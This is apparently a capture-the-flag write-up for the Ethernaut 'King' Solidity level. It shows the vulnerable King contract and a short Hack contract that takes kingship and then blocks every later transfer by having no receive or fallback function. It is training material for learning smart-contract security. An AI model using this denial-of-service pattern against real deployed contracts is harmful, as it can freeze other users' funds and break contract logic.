# Type - Beyond the console

### The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

```

# Solution

1. Get a new isntance
2. It is observed that if the sender can deny kingship to anyone else  but own , they can win this challenge
3. To claim kingship , one has to call the receive() and must satisfy one of the two mentioned conditions ,the payable function sends the eth to the previous king and the current msg.sender claims kingship and the prize the current sent eth
4. If another sender sends more eth, they claim the kingship, in order to avoid this scenario we can make sure the transfer may fail and no one can claim the kingship
5. WE can make another contract that sends some eth and triggers the  receive function
 ```
       contract Hack {
            constructor(address payable target) payable {
            uint prize = King(target).prize();
            (bool ok, ) =target.call{value:prize}("");
            require(ok,"call failed");
              }
            }
```
6. To deny kingship , we simply chose to not have any fallbacks or receive
